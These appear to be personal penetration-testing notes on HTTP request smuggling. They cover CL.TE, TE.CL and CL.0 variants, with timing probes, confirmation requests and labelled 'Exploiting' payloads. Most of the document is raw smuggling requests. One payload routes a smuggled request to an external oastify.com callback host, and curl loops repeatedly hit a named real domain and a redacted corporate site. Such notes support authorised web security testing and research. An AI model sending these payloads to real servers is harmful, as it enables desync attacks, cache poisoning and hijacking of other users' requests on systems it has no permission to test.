
# HTTP Request Smuggling Testing Notes

---

## 🧪 CL.TE (Content-Length + Transfer-Encoding) HTTP Request Smuggling

### Finding CL.TE Vulnerabilities Using Timing Techniques

```http
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

If this causes an observable time delay, it indicates a possible vulnerability.

### 🔍 Notes for CL.TE

#### ✅ Exploit Case

- `Content-Length` is larger than needed
- Example request:

```
Content-Length: 53
Transfer-Encoding: chunked

0

GET /wrtztrw?wrtztrw=wrtztrw HTTP/1.1
X-YzBqv: 
```

- Length is counted from `0` to `X-YzBqv: `
- The `0` marks the end of chunked data — the smuggled request follows

#### ❌ Timeout/No Vulnerability

- If `0` is missing or misaligned, it may lead to timeout or no smuggling

### ⏱ Finding CL.TE Vulnerabilities Using Timing Techniques

```http
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

If this causes an observable delay, it may indicate a vulnerability.

### ✅ Confirming CL.TE Vulnerabilities

```http
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Transfer-Encoding: chunked

0

GET /wrtztrw?wrtztrw=wrtztrw HTTP/1.1
X-YzBqv: 
```

---

## 🧪 TE.CL (Transfer-Encoding + Content-Length) HTTP Request Smuggling

### 🔍 Notes for TE.CL

#### ✅ Exploit Case

- End the body with `0`
- Example request:

```
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x= 
0
```

- `7c` is the hex length of the smuggled request (from `GET` to `x= `)
- `Content-Length: 4` accounts for `7c
  r\n`

### ⏱ Finding TE.CL Vulnerabilities Using Timing Techniques

```http
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

If this causes a delay, it suggests possible desync.

### ✅ Confirming TE.CL Vulnerabilities

```http
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4

30
GET /wrtztrw?wrtztrw=wrtztrw HTTP/1.1
X-YzBqv: 
0
```

---

## 📦 Testing CL.0 Gadget: `nameprefix1`

### 🔍 Finding

```http
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Foo: bar
 Content-Length: 48

GET /wrtztrw?wrtztrw=wrtztrw HTTP/1.1
X-YzBqv: 
```

### ✅ Confirming via Curl

```bash
for i in $(seq 1 1000); do 
  curl -s -o /dev/null -w "%{url_effective} --redirects-to--> %{redirect_url} %{http_code}" http://digitalocean.com/
  sleep 0.4
  echo ""
done
```

### 🎯 Exploiting

```http
Connection: keep-alive
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Foo: bar
 Content-Length: 42

GET http://ho91jd5p3qdby7ukzsewyrqif9l09qxf.oastify.com/smuggle_gadget_namespace1/ HTTP/1.1
Smuggle: 
```

### 📚 Reference

- https://blog.malicious.group/from-akamai-to-f5-to-ntlm/

---

## 📦 Testing CL.0 Gadget: `CL-plus`

### 🔍 Finding

```http
Connection: keep-alive
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: +48

GET /wrtztrw?wrtztrw=wrtztrw HTTP/1.1
Smuggle:  
```

### ✅ Confirming via Curl

```bash
for i in $(seq 1 1000); do 
  curl -s -o /dev/null -w "%{url_effective} --redirects-to--> %{redirect_url} %{http_code}" http://corporate-trust.redacted.tld/
  sleep 2
  echo ""
done
```

### 🎯 Exploiting

```http
Connection: keep-alive
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: +36

GET @example.com HTTP/1.1
Smuggle: 
```

### 📚 Reference

- https://blog.malicious.group/http-is-dead-long-live-http/

---

## 🔗 References

- https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn  
- https://portswigger.net/web-security/request-smuggling/finding#finding-cl-te-vulnerabilities-using-timing-techniques
